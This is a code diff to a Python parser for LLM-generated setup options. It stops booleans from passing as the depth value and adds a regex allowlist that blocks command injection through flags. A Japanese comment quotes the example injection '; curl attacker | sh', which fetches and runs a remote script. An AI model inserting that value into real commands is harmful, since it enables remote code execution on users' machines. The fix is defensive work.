@@ -2157,10 +2157,19 @@ def _parse_setup_llm(text, known_checks) -> "Optional[dict]":
     if not checks:
         return None  # 有効な check が皆無＝無効応答として扱う
     depth = data.get("depth")
-    if not isinstance(depth, int) or not (1 <= depth <= 5):
+    # bool は int のサブクラス（isinstance(True,int)==True）なので type() で厳密判定する。
+    # さもないと depth=true が通り `--depth True` を生成し argparse が弾く（#170 P2）。
+    if type(depth) is not int or not (1 <= depth <= 5):
         depth = 2
-    flags_raw = data.get("flags")
-    flags = [f for f in flags_raw if isinstance(f, str)] if isinstance(flags_raw, list) else []
+    # flags は setup が出すコピー可能コマンドへそのまま連結される。LLM が
+    # `; curl attacker | sh` 等を返すとコマンド注入になるため、安全な flag 形
+    # （`--flag` / `--flag=value`・シェルメタ文字/空白なし）だけを許可する（#170 P2）。
+    flags_raw = data.get("flags") if isinstance(data.get("flags"), list) else []
+    flags = [
+        f for f in flags_raw
+        if isinstance(f, str)
+        and _re.fullmatch(r"--[A-Za-z][A-Za-z0-9-]*(=[A-Za-z0-9_.,:/@-]+)?", f)
+    ]
     reason = data.get("reason") if isinstance(data.get("reason"), str) else ""
     return {"checks": checks, "depth": depth, "flags": flags, "reason": reason}
 
